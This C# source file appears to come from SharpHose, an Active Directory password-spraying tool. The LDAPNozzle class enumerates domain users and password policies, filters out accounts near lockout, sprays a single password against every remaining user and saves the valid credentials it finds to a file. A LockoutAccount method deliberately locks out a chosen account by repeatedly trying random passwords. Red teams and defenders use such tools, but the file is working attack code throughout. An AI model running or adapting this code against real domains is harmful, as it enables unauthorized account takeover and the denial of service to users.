using SharpHose.Common.Enums;
using SharpHose.Common.Helpers;
using SharpHose.Common.Objects;
using System;
using System.Collections.Generic;
using System.DirectoryServices;
using System.DirectoryServices.AccountManagement;
using System.DirectoryServices.ActiveDirectory;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace SharpHose.Nozzles.LDAP
{
    public class LDAPNozzle : Nozzle
    {
        public BaseLoggerHelper _logger;

        public override string Name { get; } = "LDAP";
        public override double Version { get; } = 1.0;
        public override SprayState CurrentState { get; set; }
        public override List<UserInfo> Users { get; set; }

        private DirectoryContext DirectoryContext { get; set; }
        private bool AuthPrincipalContext { get; set; }
        private DirectoryEntry DirectoryEntry { get; set; }
        private List<LDAPPasswordPolicy> Policies { get; set; }
        private LDAPConfig Config { get; set; }

        public LDAPNozzle(LDAPConfig config)
        {
            Users = new List<UserInfo>();
            Config = config;

            _logger = Config.Logger;

            PrepareNozzle();
        }

        public override void Start()
        {
            CurrentState = SprayState.START;

            var excluded = new List<string>();
            if (Config.ExcludeUsers)
                excluded = File.ReadAllLines(Config.ExcludeFilePath).ToList();

            var removedUnsafe = Users.RemoveAll(x => x.UserState != UserState.SAFE_TO_SPRAY);

            var fineGrainedPoliciesUserCount = Policies
                .Where(x => x.IsFineGrained)
                .Sum(y => y.AppliesToUsers.Count());

            var defaultPolicyUserCount = Users.Count() - fineGrainedPoliciesUserCount;

            var removedExcluded = Users.RemoveAll(x => excluded.Contains(x.Username, StringComparer.OrdinalIgnoreCase));

            _logger.Log($"Default Policy: {defaultPolicyUserCount} total user(s)");
            _logger.Log($"Fine Grained Policies: {fineGrainedPoliciesUserCount} total user(s)");
            _logger.Log($"Removed {removedUnsafe} unsafe user(s)");
            _logger.Log($"Removed {removedExcluded} excluded user(s)");
            _logger.Log($"Preparing to spray {Users.Count} user(s)");

            if (!Config.Auto)
            {
                Console.WriteLine("Would you like to begin spraying? [y/n]");
                var response = Console.ReadLine().Substring(0, 1).ToLower();

                if (response == "y")
                {
                    _logger.Log($"Starting spray...");
                }
                else
                {
                    _logger.Log($"Spraying cancelled by user...");
                    Environment.Exit(0);
                }
            }

            var now = DateTime.Now;
            var path = string.IsNullOrEmpty(Config.OutputPath) ? "c:\\" : Config.OutputPath;
            var fileNameNow = now.ToString("yyyyMddHHmm");
            var fileName = $"credentials_{fileNameNow}.txt";
            var filePath = Path.Combine(path, fileName);

            var contents = string.Empty;
            int sprayed = 0;
            int found = 0;

            foreach (var user in Users)
            {
                if (!excluded.Contains(user.Username, StringComparer.OrdinalIgnoreCase))
                {
                    if (TryCredentialsAsync(user.Username, Config.SprayPassword).Result)
                    {
                        _logger.Log($"SUCCESS: {user.Username} / {Config.SprayPassword}");

                        if (Config.SaveOutput)
                        {
                            contents += $"{user.Username},{Config.SprayPassword}\n";
                        }
                        found += 1;
                    }
                    sprayed += 1;
                }
            }

            if (Config.SaveOutput)
            {
                File.WriteAllText(filePath, contents);
            }

            CurrentState = SprayState.READY;
            _logger.Log($"Done! Found {found} / {sprayed} credential(s)...");
        }

        public override void Stop()
        {
            _logger.Log($"Stopping spray...");
        }

        public override void Pause()
        {
            _logger.Log($"Pausing spray...");
        }

        public int DisplayPolicyUsers(string policyName, bool onlyCount = false)
        {
            var users = new List<string>();
            var policy = Policies.FirstOrDefault(x => x.Name.ToLower() == policyName.ToLower());

            if (policy != null)
            {
                if (policy.IsFineGrained)
                {
                    users = policy.AppliesToUsers;
                }
                else
                {
                    var domUsers = new List<string>();
                    Users.ForEach(x => domUsers.Add(x.Username));

                    var fgUsers = new List<string>();
                    Policies.Where(x => x.IsFineGrained).ToList()
                        .ForEach(p => p.AppliesToUsers.ForEach(x => fgUsers.Add(x)));

                    users = domUsers.Where(p => fgUsers.All(p2 => p2.ToLower() != p.ToLower()))
                        .Distinct().ToList();
                }

                if (!onlyCount)
                {
                    _logger.Log($"-----------------------------------");

                    var contents = string.Empty;
                    var now = DateTime.Now;
                    var path = string.IsNullOrEmpty(Config.OutputPath) ? "c:\\" : Config.OutputPath;
                    var cleanPolicyName = Regex.Replace(policy.Name, "[^a-zA-Z0-9_.]+", "", RegexOptions.Compiled);
                    var fileNameNow = now.ToString("yyyyMddHHmm");
                    var fileName = $"policyusers_{cleanPolicyName}_{fileNameNow}.txt";
                    var filePath = Path.Combine(path, fileName);
                    var fileNow = now.ToString("MM/dd/yyyy h:mm tt");

                    foreach (var user in users)
                    {
                        _logger.Log($"User: {user}");

                        if (Config.SaveOutput)
                            contents += $"{user}\n";
                    }

                    if (Config.SaveOutput)
                        File.WriteAllText(filePath, contents);

                    _logger.Log($"-----------------------------------");
                }
            }
            else
            {
                _logger.Log($"Policy not found: {policyName}");
            }
            return users.Count;
        }

        public void DisplayEnabledUsers()
        {
            _logger.Log($"Found the following {Users.Count} enabled users for the domain: {Config.DomainName}");
            _logger.Log($"-----------------------------------");

            var now = DateTime.Now;
            var path = string.IsNullOrEmpty(Config.OutputPath) ? "c:\\" : Config.OutputPath;
            var fileNameNow = now.ToString("yyyyMddHHmm");
            var fileName = $"users_{fileNameNow}.txt";
            var filePath = Path.Combine(path, fileName);

            var contents = string.Empty;
            var fileNow = now.ToString("MM/dd/yyyy h:mm tt");

            foreach (var user in Users)
            {
                _logger.Log($"User: {user.Username}");

                if (Config.SaveOutput)
                    contents += $"{user.Username}\n";
            }

            if (Config.SaveOutput)
                File.WriteAllText(filePath, contents);

            _logger.Log($"-----------------------------------");
        }

        public void DisplayPolicies()
        {
            _logger.Log($"Found the following policies ({Policies.Count}):");

            foreach (var policy in Policies.OrderBy(x => x.PasswordPrecendence))
            {
                DisplayPolicyDetails(policy);
                _logger.Log($"-----------------------------------");
            }
        }

        private void DisplayPolicyDetails(LDAPPasswordPolicy policy)
        {
            var count = DisplayPolicyUsers(policy.Name, true);

            var lockoutDurationTs = new TimeSpan(policy.LockoutDuration * -1);
            var lockoutObservationWindowTs = new TimeSpan(policy.LockoutObservationWindow * -1);
            var MinimumPasswordAgeTs = new TimeSpan(policy.MinimumPasswordAge * -1);
            var MaximumPasswordAgeTs = new TimeSpan(policy.MaximumPasswordAge * -1);

            _logger.Log($"-----------------------------------");
            _logger.Log($"Name: {policy.Name}");
            _logger.Log($"Order Precedence: {policy.PasswordPrecendence}");
            _logger.Log($"ADs Path: {policy.ADSPath}");
            _logger.Log($"Is Fine Grained? {policy.IsFineGrained}");
            if (policy.IsFineGrained) { _logger.Log($"Applied to: {policy.AppliesToUsers.Count} users"); }
            _logger.Log($"Minimum Password Length: {policy.MinimumPasswordLength}");
            _logger.Log($"Lockout Threshold: {policy.LockoutThreshold}");
            _logger.Log($"Lockout Duration: {string.Format("{0:%d}d {0:%h}h {0:%m}m {0:%s}s", lockoutDurationTs)}");
            _logger.Log($"Lockout Observation Window: {string.Format("{0:%d}d {0:%h}h {0:%m}m {0:%s}s", lockoutObservationWindowTs)}");
            _logger.Log($"Minimum / Maximum Password Age: {string.Format("{0:%d}d {0:%h}h {0:%m}m {0:%s}s", MinimumPasswordAgeTs)} / {string.Format("{0:%d}d {0:%h}h {0:%m}m {0:%s}s", MaximumPasswordAgeTs)}");
            _logger.Log($"Password History Length: {policy.PasswordHistoryLength}");
            _logger.Log($"Applies to: {count} users");

            if (Config.SaveOutput)
            {
                var cleanPolicyName = Regex.Replace(policy.Name, "[^a-zA-Z0-9_.]+", "", RegexOptions.Compiled);
                var now = DateTime.Now;
                var fileNameNow = now.ToString("yyyyMddHHmm");
                var fileName = $"policy_{cleanPolicyName}_{fileNameNow}.txt";
                var filePath = Path.Combine(Config.OutputPath, fileName);

                var contents = string.Empty;
                var fileNow = now.ToString("MM/dd/yyyy h:mm tt");

                contents += $"Date Captured: {fileNow}\n";
                contents += $"Name: {policy.Name}\n";
                contents += $"Order Precedence: {policy.PasswordPrecendence}\n";
                contents += $"ADs Path: {policy.ADSPath}\n";
                contents += $"Is Fine Grained? {policy.IsFineGrained}\n";
                if (policy.IsFineGrained) { contents += $"Applied to: {policy.AppliesToUsers.Count} users\n"; }
                contents += $"Minimum Password Length: {policy.MinimumPasswordLength}\n";
                contents += $"Lockout Threshold: {policy.LockoutThreshold}\n";
                contents += $"Lockout Duration: {string.Format("{0:%d}d {0:%h}h {0:%m}m {0:%s}s", lockoutDurationTs)}\n";
                contents += $"Lockout Observation Window: {string.Format("{0:%d}d {0:%h}h {0:%m}m {0:%s}s", lockoutObservationWindowTs)}\n";
                contents += $"Minimum / Maximum Password Age: {string.Format("{0:%d}d {0:%h}h {0:%m}m {0:%s}s", MinimumPasswordAgeTs)} / {string.Format("{0:%d}d {0:%h}h {0:%m}m {0:%s}s", MaximumPasswordAgeTs)}\n";
                contents += $"Password History Length: {policy.PasswordHistoryLength}\n";
                contents += $"Applies to: {count} users\n";

                File.WriteAllText(filePath, contents);
            }
        }


        private async Task<bool> TryCredentialsAsync(string username, string password)
        {
            return await Task.Run(() =>
            {
                using (var context = GetPrincipalContext())
                {
                    return context.ValidateCredentials(username, password);
                }
            });
        }

        private void PrepareNozzle()
        {
            LoadDomainContext();
            GetPasswordPolicies();
            GetUsers();
        }

        private string FindDomainController()
        {
            var pingSender = new Ping();
            var options = new PingOptions();
            options.DontFragment = true;

            byte[] buffer = Encoding.ASCII.GetBytes(new string('A', 32));
            var reply = pingSender.Send(Config.DomainName, 120, buffer, options);
            if (reply.Status == IPStatus.Success)
            {
                try
                {
                    return Dns.GetHostEntry(reply.Address.ToString()).HostName;
                }
                catch
                {
                    return reply.Address.ToString();
                }
            }
            else
            {
                return string.Empty;
            }
        }

        private void LoadDomainContext()
        {
            Policies = new List<LDAPPasswordPolicy>();
            Users = new List<UserInfo>();

            if ((!string.IsNullOrEmpty(Config.DomainUsername)) && (!string.IsNullOrEmpty(Config.DomainPassword)))
            {
                if (string.IsNullOrEmpty(Config.DomainController))
                {
                    Config.DomainController = FindDomainController();
                }

                if (!string.IsNullOrEmpty(Config.DomainController))
                {
                    DirectoryContext = new DirectoryContext(
                        DirectoryContextType.DirectoryServer,
                        Config.DomainController,
                        Config.DomainUsername,
                        Config.DomainPassword
                    );
                    AuthPrincipalContext = true;

                    DirectoryEntry = new DirectoryEntry($"LDAP://{Config.DomainName}");
                }
                else
                {
                    _logger.Log("[-] Cannot find domain controller from domain name.");
                    Environment.Exit(0);
                }
            }
            else
            {
                if (ContextHelper.IsInDomain())
                {
                    Config.DomainName = IPGlobalProperties.GetIPGlobalProperties().DomainName;
                    Config.DomainController = ActiveDirectorySite.GetComputerSite().InterSiteTopologyGenerator.Name;

                    _logger.Log($"[-] Retrieved domain and controller: {Config.DomainName} / {Config.DomainController}");

                    DirectoryContext = new DirectoryContext(
                        DirectoryContextType.DirectoryServer,
                        Config.DomainController
                    );
                    AuthPrincipalContext = false;

                    DirectoryEntry = new DirectoryEntry($"LDAP://{Config.DomainController}");
                }
                else
                {
                    _logger.Log("[-] Not joined to a domain and no username/password provided.");
                    Environment.Exit(0);
                }
            }
        }

        private PrincipalContext GetPrincipalContext()
        {
            if (AuthPrincipalContext)
            {
                return new PrincipalContext(
                    ContextType.Domain,
                    Config.DomainController,
                    Config.DomainUsername,
                    Config.DomainPassword
                );
            }
            else
            {
                return new PrincipalContext(
                    ContextType.Domain,
                    Config.DomainController
                );
            }
        }

        private List<string> GetPasswordPolicyUsers(LDAPPasswordPolicy policy)
        {
            _logger.Log($"[-] Retrieving users for policy: {policy.Name}");

            var users = new List<string>();
            policy.AppliesToDN.ForEach(a =>
            {
                var groupSearch = new DirectorySearcher(DirectoryEntry);
                groupSearch.Filter = $"(&(objectCategory=user)(memberOf={a}))";
                groupSearch.PageSize = 1000;
                groupSearch.PropertiesToLoad.Add("sAMAccountName");
                groupSearch.SearchScope = SearchScope.Subtree;

                var groupResults = groupSearch.FindAll();
                if (groupResults.Count > 0)
                {
                    for (var i = 0; i < groupResults.Count; i++)
                    {
                        var username = (string)groupResults[i].Properties["sAMAccountname"][0];
                        users.Add(username.ToLower());
                    }
                }
                else
                {
                    var userSearch = new DirectorySearcher(DirectoryEntry);
                    userSearch.Filter = $"(&(objectCategory=user)(distinguishedName={a}))";
                    userSearch.PageSize = 1000;
                    userSearch.PropertiesToLoad.Add("sAMAccountName");
                    userSearch.SearchScope = SearchScope.Subtree;
                    var userResults = userSearch.FindOne();

                    if (userResults != null)
                    {
                        var username = (string)userResults.Properties["sAMAccountname"][0];
                        users.Add(username.ToLower());
                    }
                }
            });
            return users;
        }

        private void GetPasswordPolicies()
        {
            Policies.Add(GetDomainPolicy());

            var fineGrainedPolicies = GetFineGrainedPolicies();

            fineGrainedPolicies.ForEach(x => x.AppliesToUsers = GetPasswordPolicyUsers(x));

            Policies.AddRange(fineGrainedPolicies);
        }

        private LDAPPasswordPolicy GetDomainPolicy()
        {
            var searcher = new DirectorySearcher(DirectoryEntry);
            searcher.SearchScope = SearchScope.Base;
            searcher.PropertiesToLoad.Add("name");
            searcher.PropertiesToLoad.Add("msds-behavior-version");
            searcher.PropertiesToLoad.Add("lockoutduration");
            searcher.PropertiesToLoad.Add("lockoutthreshold");
            searcher.PropertiesToLoad.Add("lockoutobservationwindow");
            searcher.PropertiesToLoad.Add("minpwdlength");
            searcher.PropertiesToLoad.Add("minpwdage");
            searcher.PropertiesToLoad.Add("maxpwdage");
            searcher.PropertiesToLoad.Add("pwdhistorylength");
            searcher.PropertiesToLoad.Add("adspath");
            searcher.PropertiesToLoad.Add("pwdproperties");

            var result = searcher.FindOne();
            var policy = new LDAPPasswordPolicy(result, false);
            policy.AppliesToUsers = new List<string>();

            return policy;
        }

        private List<LDAPPasswordPolicy> GetFineGrainedPolicies()
        {
            var policies = new List<LDAPPasswordPolicy>();
            var policySearch = new DirectorySearcher(DirectoryEntry);

            policySearch.Filter = $"(objectclass=msDS-PasswordSettings)";
            policySearch.PropertiesToLoad.Add("name");
            policySearch.PropertiesToLoad.Add("msds-lockoutthreshold");
            policySearch.PropertiesToLoad.Add("msds-psoappliesto");
            policySearch.PropertiesToLoad.Add("msds-minimumpasswordlength");
            policySearch.PropertiesToLoad.Add("msds-passwordhistorylength");
            policySearch.PropertiesToLoad.Add("msds-lockoutobservationwindow");
            policySearch.PropertiesToLoad.Add("msds-lockoutduration");
            policySearch.PropertiesToLoad.Add("msds-minimumpasswordage");
            policySearch.PropertiesToLoad.Add("msds-maximumpasswordage");
            policySearch.PropertiesToLoad.Add("msds-passwordsettingsprecedence");
            policySearch.PropertiesToLoad.Add("msds-passwordcomplexityenabled");
            policySearch.PropertiesToLoad.Add("msds-passwordreversibleencryptionenabled");

            var pwdPolicies = policySearch.FindAll();

            foreach (SearchResult result in pwdPolicies)
            {
                var policy = new LDAPPasswordPolicy(result, true);
                policy.AppliesToUsers = GetPasswordPolicyUsers(policy);
                policies.Add(policy);
            }

            return policies;
        }

        public void LockoutAccount(string username, int count = 10)
        {
            for (var i = 0; i < count; i++)
            {
                using (var context = GetPrincipalContext())
                {
                    context.ValidateCredentials(
                        username,
                        Guid.NewGuid().ToString("n").Substring(0, 15)
                    );
                }
            }
            _logger.Log($"Locked out: {username}");
        }

        private void GetUsers()
        {
            _logger.Log("[-] Querying for users...");

            try
            {
                var userSearch = new DirectorySearcher(DirectoryEntry);
                userSearch.Filter = $"(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2){Config.FilterLDAP})";
                userSearch.PageSize = 1000;
                userSearch.PropertiesToLoad.Add("sAMAccountName");
                userSearch.PropertiesToLoad.Add("badPwdCount");
                userSearch.PropertiesToLoad.Add("badPasswordTime");
                userSearch.PropertiesToLoad.Add("lockoutTime");
                userSearch.PropertiesToLoad.Add("lockoutDuration");
                userSearch.PropertiesToLoad.Add("pwdLastSet");
                userSearch.SearchScope = SearchScope.Subtree;

                var results = userSearch.FindAll();

                if (results != null)
                {
                    for (var i = 0; i < results.Count; i++)
                    {
                        LDAPPasswordPolicy policy;
                        var user = new LDAPUserInfo(results[i]);

                        policy = user.GetUserPolicy(Policies);
                        user = user.ClassifyUser(policy);

                        Users.Add(user);
                    }

                    _logger.Log($"[-] Total Users: {Users.Count}");
                }
                else
                {
                    _logger.Log("[-] Failed to retrieve the usernames from Active Directory; the script will exit.");
                    Environment.Exit(0);
                }

                _logger.Log($"Queried {results.Count} users w/ {Policies.Count} password policies identified...");
            }
            catch (Exception ex)
            {
                _logger.Log("[-] Failed to find or connect to Active Directory, or another issue occurred.");
                _logger.Log($"[-] Exception: {ex}");

                Environment.Exit(0);
            }
        }
    }
}
